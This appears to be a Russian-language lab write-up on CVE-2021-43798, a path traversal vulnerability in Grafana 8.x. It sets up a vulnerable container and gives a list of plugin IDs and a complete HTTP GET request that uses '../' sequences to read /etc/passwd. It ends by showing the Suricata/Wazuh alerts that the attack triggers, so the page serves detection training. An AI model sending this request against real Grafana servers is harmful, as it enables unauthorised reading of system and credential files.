# CVE-2021-43798

Grafana — это многоплатформенное веб-приложение для аналитики и интерактивной визуализации с открытым исходным кодом. В декабре 2021 года пользователь Twitter обнаружил уязвимость 0day, позволяющую злоумышленникам, не прошедшим проверку подлинности, использовать эту уязвимость для увеличения веб-пути и загрузки произвольных файлов через URL-адрес Grafana 8.x.

### Эксплуатация уязвимости

Для того, чтобы запустить уязвимый сервер Grafana 8.2.6, выполните команду&#x20;

```
docker compose up -d
```

После запуска сервера вы можете просмотреть страницу входа по адресу `http://ваш-ip:3000`, учетные данные для этой уязвимости отсутствуют.

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Уязвимость вызвана модулем плагина, который может обслуживать статический файл внутри папки плагина. Но для обхода проверки злоумышленник может использовать `../`, чтобы перейти из папки плагина в родительскую папку и загрузить произвольные файлы. Чтобы проэксплуатировать данную уязвимость, вам необходимо знать действительный идентификатор плагина, например alertlist. Вот некоторые из распространенных идентификаторов плагина:

```
alertlist
cloudwatch
dashlist
elasticsearch
graph
graphite
heatmap
influxdb
mysql
opentsdb
pluginlist
postgres
prometheus
stackdriver
table
text
```

Отправьте следующий GET-запрос, чтобы прочитать файл /etc/passwd

```
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 10.10.11.130:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости и о выводе файла /etc/passwd в ответе на ваш запрос.

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
